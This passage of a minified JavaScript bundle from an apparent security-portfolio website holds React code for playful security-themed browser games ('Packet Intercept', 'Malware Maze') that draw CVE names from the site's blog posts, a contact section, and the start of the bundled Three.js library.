n=qS(e),[i,s]=$.useState(()=>Hc(t)),[r,a]=$.useState(()=>Gc(i)),[o,l]=$.useState(()=>Ro(r)),[c,h]=$.useState(()=>bi.map(()=>!1)),[d,p]=$.useState(0),[f,y]=$.useState(0),[_,g]=$.useState(()=>Co(0,n)),[u,v]=$.useState("active"),[x,S]=$.useState(()=>Wc(n)),[E,A]=$.useState(null),C=$.useRef(null),L=$.useMemo(()=>({year:(i==null?void 0:i.year)||"Unknown",severity:(i==null?void 0:i.severity)||"Unknown",signature:r}),[i,r]);$.useEffect(()=>{C.current&&(C.current.scrollTop=C.current.scrollHeight)},[x]),$.useEffect(()=>{if(!t.length)return;const W=Hc(t),j=Gc(W);s(W),a(j),l(Ro(j)),h(bi.map(()=>!1)),p(0),y(0),g(Co(0,n)),A(null),v("active"),S([...Wc(n),{type:"system",text:"New traffic signature loaded."}])},[t,e]);const w=(W,j="info")=>{S(X=>[...X,{type:j,text:W}])},M=(W=f)=>{l(Ro(r)),h(bi.map(()=>!1)),g(Co(W,n)),A(null)},k=()=>{const W=Hc(t),j=Gc(W);s(W),a(j),l(Ro(j)),h(bi.map(()=>!1)),p(0),y(0),g(Co(0,n)),A(null),v("active"),S([...Wc(n),{type:"system",text:"New case file opened."}])},H=W=>{if(u!=="found"&&!c[W]){if(_<=0){w("Scan budget exhausted. Intercept to continue.","warning");return}h(j=>j.map((X,D)=>D===W?!0:X)),g(j=>j-1),w(`Scan lane ${bi[W].toUpperCase()}: checksum surfaced.`,"info")}},V=W=>{if(u==="found")return;const j=W===o.maliciousLane;if(A({lane:W,hit:j}),j){const X=d+1;if(p(X),w(`Intercept success on ${bi[W].toUpperCase()}.`,"success"),X>=n.captureGoal){v("found"),w("Threat chain neutralized.","success");return}M(f)}else{const X=f+1;y(X),w(`False positive on ${bi[W].toUpperCase()}.`,"warning"),M(X)}};return m.jsxs("div",{className:"intercept-layout",children:[m.jsxs("div",{className:"intercept-panel",children:[m.jsxs("div",{className:"intercept-header",children:[m.jsxs("div",{children:[m.jsx("div",{className:"intercept-title",children:"Packet Intercept"}),m.jsx("div",{className:"intercept-subtitle",children:"Scan lanes, then trigger quarantine."})]}),m.jsx("div",{className:`intercept-status ${u}`,children:u==="found"?"SECURED":"ACTIVE"})]}),m.jsxs("div",{className:"intercept-intel",children:[m.jsxs("div",{className:"intercept-intel-row",children:[m.jsx("span",{children:"Signature"}),m.jsx("span",{children:L.signature})]}),m.jsxs("div",{className:"intercept-intel-row",children:[m.jsx("span",{children:"Year"}),m.jsx("span",{children:L.year})]}),m.jsxs("div",{className:"intercept-intel-row",children:[m.jsx("span",{children:"Severity"}),m.jsx("span",{children:L.severity})]}),m.jsxs("div",{className:"intercept-intel-row",children:[m.jsx("span",{children:"Captures"}),m.jsxs("span",{children:[d,"/",n.captureGoal]})]}),m.jsxs("div",{className:"intercept-intel-row",children:[m.jsx("span",{children:"Misses"}),m.jsx("span",{children:f})]}),m.jsxs("div",{className:"intercept-intel-row",children:[m.jsx("span",{children:"Scans left"}),m.jsx("span",{children:_})]})]}),m.jsx("div",{className:"intercept-hint",children:"Match the checksum to the signature. Scan reveals lane data."}),m.jsxs("div",{className:"intercept-actions",children:[m.jsx("button",{className:"pill",type:"button",onClick:M,children:"New packet"}),m.jsx("button",{className:"pill",type:"button",onClick:k,children:"New case"}),u==="found"&&(i==null?void 0:i.href)&&m.jsx("a",{className:"button primary",href:i.href,target:"_blank",rel:"noreferrer",children:"Open report"})]}),m.jsx("div",{className:"intercept-log",ref:C,children:x.map((W,j)=>m.jsx("div",{className:`intercept-line ${W.type}`,children:W.text},`${W.type}-${j}`))}),u==="found"&&m.jsxs("div",{className:"intercept-result",children:[m.jsx("div",{className:"intercept-result-title",children:"Threat captured"}),m.jsx("div",{className:"intercept-result-id",children:(i==null?void 0:i.id)||"Unknown"}),m.jsx("div",{className:"intercept-result-text",children:i==null?void 0:i.title})]})]}),m.jsx("div",{className:`intercept-stage ${u==="found"?"win":""}`,children:m.jsx("div",{className:"lane-grid",children:o.packets.map((W,j)=>{const X=c[j],D=(E==null?void 0:E.lane)===j?E.hit?"hit":"miss":"";return m.jsxs("div",{className:`lane-card ${X?"inspected":""} ${D}`,children:[m.jsxs("div",{className:"lane-header",children:[m.jsx("div",{className:"lane-title",children:W.lane}),m.jsxs("div",{className:"lane-risk",children:[m.jsx("span",{children:"Risk"}),m.jsx("span",{children:W.risk})]})]}),m.jsx("div",{className:"lane-stream",children:Array.from({length:3}).map((N,O)=>m.jsx("span",{className:"lane-packet",style:{animationDelay:`${O*.6}s`}},`${W.lane}-flow-${O}`))}),m.jsx("div",{className:"lane-body",children:X?m.jsxs("div",{className:"lane-metrics",children:[m.jsxs("div",{children:["checksum: ",W.checksum]}),m.jsxs("div",{children:["latency: ",W.latency,"ms"]}),m.jsxs("div",{children:["burst: ",W.burst]})]}):m.jsx("div",{className:"lane-encrypted",children:"Encrypted payload"})}),m.jsxs("div",{className:"lane-actions",children:[m.jsx("button",{type:"button",onClick:()=>H(j),children:"Scan"}),m.jsx("button",{type:"button",onClick:()=>V(j),children:"Intercept"})]})]},W.lane)})})})]})}const Gn=5,lm={easy:{maxWalls:5,scanCharges:4,probeCharges:3},standard:{maxWalls:7,scanCharges:3,probeCharges:2},hard:{maxWalls:9,scanCharges:2,probeCharges:1}},$S=new Set(["reverse","engineering","from","with","into","watchguard","firebox","kernel","linux","audit","transient","scheduler","attacks","understanding","cve","blog","server","tiny","fake"]),KS=t=>{const i=(t||"").toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean).find(s=>s.length>4&&!$S.has(s));return i?i.toUpperCase():"VECTOR"},ZS=t=>t.length?t[Math.floor(Math.random()*t.length)]:{id:"UNKNOWN",title:"Unknown cluster",year:"Unknown",severity:"Unknown",summary:"",href:""},Cn=(t,e)=>`${t}-${e}`,bd=(t,e)=>t>=0&&e>=0&&t<Gn&&e<Gn,B0=(t,e)=>[{row:t-1,col:e},{row:t+1,col:e},{row:t,col:e-1},{row:t,col:e+1}],JS=(t,e,n)=>{const i=[t],s=new Set([Cn(t.row,t.col)]);for(;i.length;){const r=i.shift();if(r.row===e.row&&r.col===e.col)return!0;B0(r.row,r.col).forEach(a=>{const o=Cn(a.row,a.col);bd(a.row,a.col)&&(n.has(o)||s.has(o)||(s.add(o),i.push(a)))})}return!1},jc=(t,e)=>{const n=ZS(t),i={row:Gn-1,col:0};let s={row:Math.floor(Math.random()*Gn),col:Math.floor(Math.random()*Gn)};for(;s.row===i.row&&s.col===i.col;)s={row:Math.floor(Math.random()*Gn),col:Math.floor(Math.random()*Gn)};let r=new Set;for(let a=0;a<24;a+=1){const o=new Set,l=[];for(let c=0;c<Gn;c+=1)for(let h=0;h<Gn;h+=1){const d=Cn(c,h);d===Cn(i.row,i.col)||d===Cn(s.row,s.col)||l.push(d)}for(;o.size<e&&l.length;){const c=Math.floor(Math.random()*l.length),[h]=l.splice(c,1);o.add(h)}if(JS(i,s,o)){r=o;break}}return{entry:n,start:i,target:s,walls:r}},Xc=(t,e)=>[{type:"system",text:"MALWARE MAZE // Wireframe grid online."},{type:"system",text:"Navigate the maze and quarantine the infected node."},{type:"info",text:`Scan charges: ${t}. Probe charges: ${e}.`}],QS=(t,e)=>{const n=e.row<t.row?"north":e.row>t.row?"south":"aligned",i=e.col<t.col?"west":e.col>t.col?"east":"aligned";return n==="aligned"&&i==="aligned"?"on target":n==="aligned"?i:i==="aligned"?n:`${n}-${i}`},ew=t=>t===0?"direct":t<=2?"hot":t<=4?"warm":t<=6?"cool":"cold";function tw({entries:t=[],difficulty:e="standard"}){var W,j,X;const n=lm[e]||lm.standard,[i,s]=$.useState(()=>jc(t,n.maxWalls)),[r,a]=$.useState(()=>i.start),[o,l]=$.useState(()=>new Set([Cn(i.start.row,i.start.col)])),[c,h]=$.useState(0),[d,p]=$.useState(n.scanCharges),[f,y]=$.useState(n.probeCharges),[_,g]=$.useState("active"),[u,v]=$.useState(()=>Xc(n.scanCharges,n.probeCharges)),x=$.useRef(null),S=$.useMemo(()=>{var D,N,O,B;return{year:((D=i.entry)==null?void 0:D.year)||"Unknown",severity:((N=i.entry)==null?void 0:N.severity)||"Unknown",keyword:KS(`${((O=i.entry)==null?void 0:O.title)||""} ${((B=i.entry)==null?void 0:B.summary)||""}`)}},[i]);$.useEffect(()=>{x.current&&(x.current.scrollTop=x.current.scrollHeight)},[u]),$.useEffect(()=>{if(!t.length)return;const D=jc(t,n.maxWalls);s(D),a(D.start),l(new Set([Cn(D.start.row,D.start.col)])),h(0),p(n.scanCharges),y(n.probeCharges),g("active"),v([...Xc(n.scanCharges,n.probeCharges),{type:"system",text:"New maze instance deployed."}])},[t,e]);const E=(D,N="info")=>{v(O=>[...O,{type:N,text:D}])},A=()=>{const D=jc(t,n.maxWalls);s(D),a(D.start),l(new Set([Cn(D.start.row,D.start.col)])),h(0),p(n.scanCharges),y(n.probeCharges),g("active"),v([...Xc(n.scanCharges,n.probeCharges),{type:"system",text:"Maze rebooted."}])},C=(D,N)=>{var oe;if(_==="found")return;const O=r.row+D,B=r.col+N;if(!bd(O,B)){E("Boundary reached. Movement blocked.","warning");return}const J=Cn(O,B);if(i.walls.has(J)){E("Firewall ahead. Choose another route.","warning");return}a({row:O,col:B}),l(ge=>{const ze=new Set(ge);return ze.add(J),ze}),h(ge=>ge+1),O===i.target.row&&B===i.target.col&&(g("found"),E("Infected node contained.","success"),E(`Identity confirmed: ${((oe=i.entry)==null?void 0:oe.id)||"Unknown"}.`,"success"))},L=()=>{if(_==="found")return;if(d<=0){E("Scan depleted. Use PROBE or move closer.","warning");return}const D=Math.abs(r.row-i.target.row)+Math.abs(r.col-i.target.col),N=ew(D),O=QS(r,i.target);p(B=>Math.max(B-1,0)),E(`Scan: signal ${N}. Direction ${O}.`,"info")},w=()=>{if(_==="found")return;if(f<=0){E("Probe depleted. Use SCAN or move.","warning");return}const D=B0(r.row,r.col).filter(N=>bd(N.row,N.col)?i.walls.has(Cn(N.row,N.col)):!0).length;y(N=>Math.max(N-1,0)),E(`Probe: ${D} firewall blocks adjacent lanes.`,"info")},M=(D,N)=>o.has(Cn(D,N)),k=(D,N)=>i.walls.has(Cn(D,N)),H=(D,N)=>r.row===D&&r.col===N,V=(D,N)=>_==="found"&&i.target.row===D&&i.target.col===N;return m.jsxs("div",{className:"maze-layout",children:[m.jsxs("div",{className:"maze-panel",children:[m.jsxs("div",{className:"maze-header",children:[m.jsxs("div",{children:[m.jsx("div",{className:"maze-title",children:"Malware Maze"}),m.jsx("div",{className:"maze-subtitle",children:"Navigate the grid and lock down the infection."})]}),m.jsx("div",{className:`maze-status ${_}`,children:_==="found"?"CONTAINED":"ACTIVE"})]}),m.jsxs("div",{className:"maze-intel",children:[m.jsxs("div",{className:"maze-intel-row",children:[m.jsx("span",{children:"Codename"}),m.jsx("span",{children:S.keyword})]}),m.jsxs("div",{className:"maze-intel-row",children:[m.jsx("span",{children:"Year"}),m.jsx("span",{children:S.year})]}),m.jsxs("div",{className:"maze-intel-row",children:[m.jsx("span",{children:"Severity"}),m.jsx("span",{children:S.severity})]}),m.jsxs("div",{className:"maze-intel-row",children:[m.jsx("span",{children:"Moves"}),m.jsx("span",{children:c})]}),m.jsxs("div",{className:"maze-intel-row",children:[m.jsx("span",{children:"Scans"}),m.jsx("span",{children:d})]}),m.jsxs("div",{className:"maze-intel-row",children:[m.jsx("span",{children:"Probes"}),m.jsx("span",{children:f})]})]}),m.jsxs("div",{className:"maze-controls",children:[m.jsxs("div",{className:"maze-dpad",children:[m.jsx("button",{type:"button",onClick:()=>C(-1,0),"aria-label":"Move north",children:"^"}),m.jsxs("div",{className:"maze-dpad-middle",children:[m.jsx("button",{type:"button",onClick:()=>C(0,-1),"aria-label":"Move west",children:"<"}),m.jsx("button",{type:"button",onClick:()=>C(0,1),"aria-label":"Move east",children:">"})]}),m.jsx("button",{type:"button",onClick:()=>C(1,0),"aria-label":"Move south",children:"v"})]}),m.jsxs("div",{className:"maze-actions",children:[m.jsx("button",{className:"pill",type:"button",onClick:L,children:"Scan"}),m.jsx("button",{className:"pill",type:"button",onClick:w,children:"Probe"}),m.jsx("button",{className:"pill",type:"button",onClick:A,children:"New maze"}),_==="found"&&((W=i.entry)==null?void 0:W.href)&&m.jsx("a",{className:"button primary",href:i.entry.href,target:"_blank",rel:"noreferrer",children:"Open report"})]})]}),m.jsx("div",{className:"maze-log",ref:x,children:u.map((D,N)=>m.jsx("div",{className:`maze-line ${D.type}`,children:D.text},`${D.type}-${N}`))}),_==="found"&&m.jsxs("div",{className:"maze-result",children:[m.jsx("div",{className:"maze-result-title",children:"Node quarantined"}),m.jsx("div",{className:"maze-result-id",children:((j=i.entry)==null?void 0:j.id)||"Unknown"}),m.jsx("div",{className:"maze-result-text",children:(X=i.entry)==null?void 0:X.title})]})]}),m.jsx("div",{className:`maze-stage ${_==="found"?"win":""}`,children:m.jsx("div",{className:"maze-grid",children:Array.from({length:Gn}).map((D,N)=>Array.from({length:Gn}).map((O,B)=>m.jsx("div",{className:["maze-cell",M(N,B)?"visited":"",k(N,B)?"wall":"",H(N,B)?"player":"",V(N,B)?"target":""].filter(Boolean).join(" ")},`${N}-${B}`)))})})]})}function nw(){const[t,e]=$.useState("node-hunt"),[n,i]=$.useState("standard"),s=$.useMemo(()=>{const l=p=>p.toUpperCase().includes("CVE"),c=p=>{if(!p)return"Unknown";const y=new Date(p).getFullYear();return Number.isFinite(y)?String(y):"Unknown"},h=p=>{const y=((p||"").match(/\d/g)||[]).reduce((g,u)=>g+Number(u),0),_=["Low","Medium","High","Critical"];return _[y%_.length]},d=p=>p==="Critical"?9.4:p==="High"?8.1:p==="Medium"?6:4;return Wa.filter(p=>l(p.title)).map(p=>{const f=p.title.match(/CVE[-–](\d{4})[-–]?([\d]+)/i),y=f?`CVE-${f[1]}-${f[2]}`:p.slug.toUpperCase(),_=h(y);return{id:y,title:p.title,severity:_,cvss:d(_),year:c(p.date),kev:!1,summary:p.excerpt,href:p.href||`/blog/${p.slug}`}})},[]),r={"node-hunt":{label:"Node Hunt",subtitle:"Track the intruder through the grid. Ping, trace, and isolate the target."},"packet-intercept":{label:"Packet Intercept",subtitle:"Scan traffic lanes and intercept the malicious payload."},"malware-maze":{label:"Malware Maze",subtitle:"Navigate the wireframe maze and quarantine the infected node."}},a=r[t]||r["node-hunt"],o={"node-hunt":am,"packet-intercept":YS,"malware-maze":tw}[t]||am;return m.jsx("section",{className:"section",children:m.jsxs("div",{className:"container",children:[m.jsxs("div",{className:"section-header",children:[m.jsxs("div",{children:[m.jsx("div",{className:"eyebrow",children:"Security Games"}),m.jsx("h2",{className:"section-title",children:"Security Games"}),m.jsx("p",{className:"section-subtitle",children:a.subtitle})]}),m.jsxs("div",{className:"section-actions",children:[m.jsxs("div",{className:"cve-game-toggle",role:"tablist","aria-label":"Security games",children:[m.jsx("button",{type:"button",role:"tab","aria-selected":t==="node-hunt",className:t==="node-hunt"?"active":"",onClick:()=>e("node-hunt"),children:r["node-hunt"].label}),m.jsx("button",{type:"button",role:"tab","aria-selected":t==="packet-intercept",className:t==="packet-intercept"?"active":"",onClick:()=>e("packet-intercept"),children:r["packet-intercept"].label}),m.jsx("button",{type:"button",role:"tab","aria-selected":t==="malware-maze",className:t==="malware-maze"?"active":"",onClick:()=>e("malware-maze"),children:r["malware-maze"].label})]}),m.jsxs("div",{className:"cve-difficulty-toggle",role:"group","aria-label":"Difficulty",children:[m.jsx("span",{className:"difficulty-label",children:"Difficulty"}),m.jsx("button",{type:"button",className:n==="easy"?"active":"",onClick:()=>i("easy"),children:"Easy"}),m.jsx("button",{type:"button",className:n==="standard"?"active":"",onClick:()=>i("standard"),children:"Standard"}),m.jsx("button",{type:"button",className:n==="hard"?"active":"",onClick:()=>i("hard"),children:"Hard"})]})]})]}),m.jsx("div",{className:"cve-hunt-shell",children:m.jsx(o,{entries:s,difficulty:n})})]})})}function iw(){const t="hemparekh1596@gmail.com",[e,n]=$.useState(!1),i=()=>{navigator.clipboard&&navigator.clipboard.writeText(t).then(()=>{n(!0),setTimeout(()=>n(!1),1800)}).catch(()=>{})};return m.jsx("section",{className:"contact-strip",id:"contact",children:m.jsxs("div",{className:"container contact-grid",children:[m.jsxs("div",{children:[m.jsx("div",{className:"eyebrow",children:"Lets talk"}),m.jsx("h2",{className:"section-title",children:"Signal received. Lets build secure systems."}),m.jsx("p",{className:"contact-blurb",children:"Ready to collaborate on security engineering, privacy, or threat research? Drop a note and we will map the next move."}),e&&m.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),m.jsxs("div",{className:"contact-actions",children:[m.jsx("button",{className:"button primary",onClick:i,type:"button",children:"Copy Email"}),m.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),m.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function sw(){const[t,e]=$.useState(0);return $.useEffect(()=>{const n=()=>{const{scrollTop:i,scrollHeight:s,clientHeight:r}=document.documentElement,a=s>r?i/(s-r)*100:0;e(Math.min(100,Math.max(0,a)))};return n(),window.addEventListener("scroll",n,{passive:!0}),()=>window.removeEventListener("scroll",n)},[]),m.jsx("div",{className:"scroll-indicator","aria-hidden":"true",children:m.jsx("div",{className:"scroll-indicator__bar",style:{height:`${t}%`}})})}function rw(){const[t,e]=$.useState(!1);return $.useEffect(()=>{const n=()=>e(window.scrollY>400);return window.addEventListener("scroll",n,{passive:!0}),n(),()=>window.removeEventListener("scroll",n)},[]),t?m.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function aw(){const t=$.useRef(null);return $.useEffect(()=>{const e=t.current;if(!e)return()=>{};let n=0,i=0,s=null;const r=o=>{n=o.clientX,i=o.clientY},a=()=>{e.style.transform=`translate(${n}px, ${i}px) translate(-50%, -50%)`,s=requestAnimationFrame(a)};return window.addEventListener("mousemove",r),a(),()=>{window.removeEventListener("mousemove",r),s&&cancelAnimationFrame(s)}},[]),m.jsx("div",{className:"cursor-w","aria-hidden":"true",children:m.jsx("div",{ref:t,className:"cursor-dot"})})}/**
 * @license
 * Copyright 2010-2025 Three.js Authors
 * SPDX-License-Identifier: MIT
 */const hp="182",ow=0,cm=1,lw=2,ll=1,cw=2,pa=3,ds=0,pn=1,wi=2,Ci=0,Tr=1,um=2,dm=3,hm=4,uw=5,As=100,dw=101,hw=102,pw=103,fw=104,mw=200,gw=201,vw=202,yw=203,Sd=204,wd=205,xw=206,_w=207,bw=208,Sw=209,ww=210,Mw=211,Ew=212,Tw=213,Aw=214,Md=0,Ed=1,Td=2,Dr=3,Ad=4,Cd=5,Rd=6,kd=7,z0=0,Cw=1,Rw=2,li=0,V0=1,H0=2,G0=3,W0=4,j0=5,X0=6,q0=7,Y0=300,Vs=301,Ur=302,Ld=303,Pd=304,ac=306,ja=1e3,Ti=1001,Nd=1002,Bt=1003,kw=1004,ko=1005,qt=1006,qc=1007,Ps=1008,_n=1009,$0=1010,K0=1011,Xa=1012,pp=1013,di=1014,si=1015,Ii=1016,fp=1017,mp=1018,qa=1020,Z0=35902,J0=35899,Q0=1021,ey=1022,qn=1023,Di=1026,Ns=1027,ty=1028,gp=1029,Or=1030,vp=1031,yp=1033,cl=33776,ul=33777,dl=33778,hl=33779,Id=35840,Dd=35841,Ud=35842,Od=35843,Fd=36196,Bd=37492,zd=37496,Vd=37488,Hd=37489,Gd=37490,Wd=37491,jd=37808,Xd=37809,qd=37810,Yd=37811,$d=37812,Kd=37813,Zd=37814,Jd=37815,Qd=37816,eh=37817,th=37818,nh=37819,ih=37820,sh=37821,rh=36492,ah=36494,oh=36495,lh=36283,ch=36284,uh=36285,dh=36286,Lw=3200,ny=0,Pw=1,$i="",Rn="srgb",Fr="srgb-linear",Bl="linear",it="srgb",qs=7680,pm=519,Nw=512,Iw=513,Dw=514,xp=515,Uw=516,Ow=517,_p=518,Fw=519,fm=35044,mm="300 es",ri=2e3,zl=2001;function iy(t){for(let e=t.length-1;e>=0;--e)if(t[e]>=65535)return!0;return!1}function Vl(t){return document.createElementNS("http://www.w3.org/1999/xhtml",t)}function Bw(){const t=Vl("canvas");return t.style.display="block",t}const gm={};function vm(...t){const e="THREE."+t.shift();console.log(e,...t)}function Ie(...t){const e="THREE."+t.shift();console.warn(e,...t)}function Ze(...t){const e="THREE."+t.shift();console.error(e,...t)}function Ya(...t){const e=t.join(" ");e in gm||(gm[e]=!0,Ie(...t))}function zw(t,e,n){return new Promise(function(i,s){function r(){switch(t.clientWaitSync(e,t.SYNC_FLUSH_COMMANDS_BIT,0)){case t.WAIT_FAILED:s();break;case t.TIMEOUT_EXPIRED:setTimeout(r,n);break;default:i()}}setTimeout(r,n)})}class Wr{addEventListener(e,n){this._listeners===void 0&&(this._listeners={});const i=this._listeners;i[e]===void 0&&(i[e]=[]),i[e].indexOf(n)===-1&&i[e].push(n)}hasEventListener(e,n){const i=this._listeners;return i===void 0?!1:i[e]!==void 0&&i[e].indexOf(n)!==-1}removeEventListener(e,n){const i=this._listeners;if(i===void 0)return;const s=i[e];if(s!==void 0){const r=s.indexOf(n);r!==-1&&s.splice(r,1)}}dispatchEvent(e){const n=this._listeners;if(n===void 0)return;const i=n[e.type];if(i!==void 0){e.target=this;const s=i.slice(0);for(let r=0,a=s.length;r<a;r++)s[r].call(this,e);e.target=null}}}const Wt=["00","01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"],Yc=Math.PI/180,hh=180/Math.PI;function io(){const t=Math.random()*4294967295|0,e=Math.random()*4294967295|0,n=Math.random()*4294967295|0,i=Math.random()*4294967295|0;return(Wt[t&255]+Wt[t>>8&255]+Wt[t>>16&255]+Wt[t>>24&255]+"-"+Wt[e&255]+Wt[e>>8&255]+"-"+Wt[e>>16&15|64]+Wt[e>>24&255]+"-"+Wt[n&63|128]+Wt[n>>8&255]+"-"+Wt[n>>16&255]+Wt[n>>24&255]+Wt[i&255]+Wt[i>>8&255]+Wt[i>>16&255]+Wt[i>>24&255]).toLowerCase()}function Ge(t,e,n){return Math.max(e,Math.min(n,t))}function Vw(t,e){return(t%e+e)%e}function $c(t,e,n){return(1-n)*t+n*e}function na(t,e){switch(e.constructor){case Float32Array:return t;case Uint32Array:return t/4294967295;case Uint16Array:return t/65535;case Uint8Array:return t/255;case Int32Array:return Math.max(t/2147483647,-1);case Int16Array:return Math.max(t/32767,-1);case Int8Array:return Math.max(t/127,-1);default:throw new Error("Invalid component type.")}}function on(t,e){switch(e.constructor){case Float32Array:return t;case Uint32Array:return Math.round(t*4294967295);case Uint16Array:return Math.round(t*65535);case Uint8Array:return Math.round(t*255);case Int32Array:return Math.round(t*2147483647);case Int16Array:return Math.round(t*32767);case Int8Array:return Math.round(t*127);default:throw new Error("Invalid component type.")}}class Je{constructor(e=0,n=0){Je.prototype.isVector2=!0,this.x=e,this.y=n}get width(){return this.x}set width(e){this.x=e}get height(){return this.y}set height(e){this.y=e}set(e,n){return this.x=e,this.y=n,this}setScalar(e){return this.x=e,this.y=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y)}copy(e){return this.x=e.x,this.y=e.y,this}add(e){return this.x+=e.x,this.y+=e.y,this}addScalar(e){return this.x+=e,this.y+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this}subScalar(e){return this.x-=e,this.y-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this}multiply(e){return this.x*=e.x,this.y*=e.y,this}multiplyScalar(e){return this.x*=e,this.y*=e,this}divide(e){return this.x/=e.x,this.y/=e.y,this}divideScalar(e){return this.multiplyScalar(1/e)}applyMatrix3(e){const n=this.x,i=this.y,s=e.elements;return this.x=s[0]*n+s[3]*i+s[6],this.y=s[1]*n+s[4]*i+s[7],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this}clamp(e,n){return this.x=Ge(this.x,e.x,n.x),this.y=Ge(this.y,e.y,n.y),this}clampScalar(e,n){return this.x=Ge(this.x,e,n),this.y=Ge(this.y,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(Ge(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this}negate(){return this.x=-this.x,this.y=-this.y,this}dot(e){return this.x*e.x+this.y*e.y}cross(e){return this.x*e.y-this.y*e.x}lengthSq(){return this.x*this.x+this.y*this.y}length(){return Math.sqrt(this.x*this.x+this.y*this.y)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)}normalize(){return this.divideScalar(this.length()||1)}angle(){return Math.atan2(-this.y,-this.x)+Math.PI}angleTo(e){const n=Math.sqrt(this.lengthSq()*e.lengthSq());if(n===0)return Math.PI/2;const i=this.dot(e)/n;return Math.acos(Ge(i,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const n=this.x-e.x,i=this.y-e.y;return n*n+i*i}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this}equals(e){return e.x===this.x&&e.y===this.y}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this}rotateAround(e,n){const i=Math.cos(n),s=Math.sin(n),r=this.x-e.x,a=this.y-e.y;return this.x=r*i-a*s+e.x,this.y=r*s+a*i+e.y,this}random(){return this.x=Math.random(),this.y=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y}}class so{constructor(e=0,n=0,i=0,s=1){this.isQuaternion=!0,this._x=e,this._y=n,this._z=i,this._w=s}static slerpFlat(e,n,i,s,r,a,o){let l=i[s+0],c=i[s+1],h=i[s+2],d=i[s+3],p=r[a+0],f=r[a+1],y=r[a+2],_=r[a+3];if(o<=0){e[n+0]=l,e[n+1]=c,e[n+2]=h,e[n+3]=d;return}if(o>=1){e[n+0]=p,e[n+1]=f,e[n+2]=y,e[n+3]=_;return}if(d!==_||l!==p||c!==f||h!==y){let g=l*p+c*f+h*y+d*_;g<0&&(p=-p,f=-f,y=-y,_=-_,g=-g);let u=1-o;if(g<.9995){const v=Math.acos(g),x=Math.sin(v);u=Math.sin(u*v)/x,o=Math.sin(o*v)/x,l=l*u+p*o,c=c*u+f*o,h=h*u+y*o,d=d*u+_*o}else{l=l*u+p*o,c=c*u+f*o,h=h*u+y*o,d=d*u+_*o;const v=1/Math.sqrt(l*l+c*c+h*h+d*d);l*=v,c*=v,h*=v,d*=v}}e[n]=l,e[n+1]=c,e[n+2]=h,e[n+3]=d}static multiplyQuaternionsFlat(e,n,i,s,r,a){const o=i[s],l=i[s+1],c=i[s+2],h=i[s+3],d=r[a],p=r[a+1],f=r[a+2],y=r[a+3];return e[n]=o*y+h*d+l*f-c*p,e[n+1]=l*y+h*p+c*d-o*f,e[n+2]=c*y+h*f+o*p-l*d,e[n+3]=h*y-o*d-l*p-c*f,e}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get w(){return this._w}set w(e){this._w=e,this._onChangeCallback()}set(e,n,i,s){return 